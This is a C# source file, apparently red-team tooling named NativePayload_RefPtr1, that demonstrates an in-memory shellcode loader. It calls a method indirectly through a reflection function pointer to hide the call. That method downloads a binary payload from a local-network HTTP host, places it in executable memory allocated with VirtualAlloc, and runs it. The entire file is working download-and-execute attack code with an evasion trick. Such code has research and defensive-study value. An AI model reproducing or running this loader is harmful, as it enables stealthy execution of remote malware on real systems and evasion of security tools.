using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;

namespace NativePayload_RefPtr1
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.WriteLine("NativePayload_RefPtr1 , Published by Damon Mohammadbagher , 20 Aug 2024");
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine("NativePayload_RefPtr1 Indirect Invoke C# Method In-Memory [without call method in src code directly]");
            Console.WriteLine();

            MethodInfo IndirectCall_TargetMethod = typeof(Program).GetMethod("ExecuteInmemory");
            IntPtr ptr = IndirectCall_TargetMethod.MethodHandle.GetFunctionPointer();
            Console.WriteLine("[!] IndirectCall_TargetMethod.MethodHandle.GetFunctionPointer.Result[" + ptr.ToString("X8") + "]");
            System.Threading.Thread.Sleep(1000);
            Delegate TechniqueD = (Action)Marshal.GetDelegateForFunctionPointer(ptr, typeof(Action));
            Console.WriteLine("[>] calling Funtion Pointer with Address  " +
                "TechniqueD.Method.MethodHandle.GetFunctionPointer().Result[" +
                TechniqueD.Method.MethodHandle.GetFunctionPointer().ToString("X8") + "]");
            TechniqueD.DynamicInvoke();
        }
        public static void ExecuteInmemory()
        {          
            string serverUrl_bin = "http://192.168.56.1:8000/https64x.bin";
            byte[] Xpayload = new WebClient().DownloadData(serverUrl_bin);
            /// Alocate Memory space for payload          
            IntPtr AddressOfPayload_In_Mem = VirtualAlloc(IntPtr.Zero, (uint)Xpayload.Length, 0x1000, 0x40);
            Console.WriteLine("[!] New Memory Space, VirtualAlloc with StartAddress VirtualAlloc.Result[" +
                AddressOfPayload_In_Mem.ToString("X8") + "]");
            Marshal.Copy(Xpayload, 0, (IntPtr)AddressOfPayload_In_Mem, Xpayload.Length);
            Delegate TechniqueD = (Action)Marshal.GetDelegateForFunctionPointer(AddressOfPayload_In_Mem, typeof(Action));
            Console.WriteLine("[>] calling Funtion Pointer with Address  TechniqueD.Method.MethodHandle.GetFunctionPointer().Result[" +
                TechniqueD.Method.MethodHandle.GetFunctionPointer().ToString("X8") + "]");
            TechniqueD.DynamicInvoke();
        }
          
        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    }
}
